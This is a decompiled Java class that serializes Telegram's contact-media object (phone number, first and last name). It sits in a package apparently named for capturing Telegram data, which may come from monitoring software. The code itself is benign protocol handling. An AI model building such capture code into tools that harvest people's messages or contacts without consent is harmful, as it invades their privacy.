package com.vvt.capture.telegram.internal;

public class TLRPC$TL_inputMediaContact
  extends TLRPC.InputMedia
{
  public static int constructor = -1494984313;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.phone_number = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.first_name = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.last_name = str;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.phone_number;
    paramAbstractSerializedData.writeString(str);
    str = this.first_name;
    paramAbstractSerializedData.writeString(str);
    str = this.last_name;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_inputMediaContact.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */